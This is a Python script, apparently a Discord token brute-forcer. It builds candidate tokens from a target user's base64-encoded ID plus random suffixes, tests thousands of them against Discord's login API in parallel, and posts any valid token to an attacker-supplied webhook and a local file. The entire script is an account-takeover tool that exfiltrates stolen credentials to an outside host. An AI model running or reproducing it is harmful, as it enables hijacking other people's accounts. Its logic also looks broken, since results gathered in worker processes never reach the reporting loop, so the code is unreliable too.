import base64
import os
import random
import string
import requests
import multiprocessing
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from discord_webhook import DiscordWebhook

# Replace <YOUR_WEBHOOK_URL> with the URL of your Discord webhook
WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"

# Set up the HTTP session with retries and backoff
retry_strategy = Retry(
    total=3,
    status_forcelist=[429, 500, 502, 503, 504],
    backoff_factor=1
)
http_adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("https://", http_adapter)

# Encode the user ID to create the initial token
id_to_token = base64.b64encode(input("ID TO TOKEN --> ").encode("ascii")).decode("ascii")

# Send a "running" message to the webhook to indicate that the code has started
webhook = DiscordWebhook(url=WEBHOOK_URL, content="@everyone Code is running")
response = webhook.execute()

# Global list to store valid tokens
valid_tokens = []

# Function to generate and test tokens
def generate_and_test_tokens(tokens):
    for token in tokens:
        headers = {'Authorization': token}
        login = session.get('https://discordapp.com/api/v9/auth/login', headers=headers)
        try:
            if login.status_code == 200:
                print('[+] VALID' + ' ' + token)
                valid_tokens.append(token)  # Append valid token to the list
            else:
                print('[-] INVALID' + ' ' + token)
        finally:
            print("")

# Number of processes to use
num_processes = 4

# Number of tokens to generate and test per process
tokens_per_process = 1000

# Generate tokens for each process
tokens = []
for _ in range(num_processes):
    token_suffixes = [''.join(random.choices(string.ascii_letters + string.digits, k=29)) for _ in range(tokens_per_process)]
    tokens.extend([f"{id_to_token}.{suffix}" for suffix in token_suffixes])

# Split tokens into chunks for each process
token_chunks = [tokens[i:i+tokens_per_process] for i in range(0, len(tokens), tokens_per_process)]

# Create and start the processes
pool = multiprocessing.Pool(processes=num_processes)
pool.map(generate_and_test_tokens, token_chunks)
pool.close()
pool.join()

# Send the valid tokens to the webhook
for token in valid_tokens:
    webhook = DiscordWebhook(url=WEBHOOK_URL, content=f"@everyone Valid token found: {token}")
    webhook.execute()
    # Write the valid token to a file
    with open('hit.txt', 'a+') as f:
        f.write(f'{token}\n')
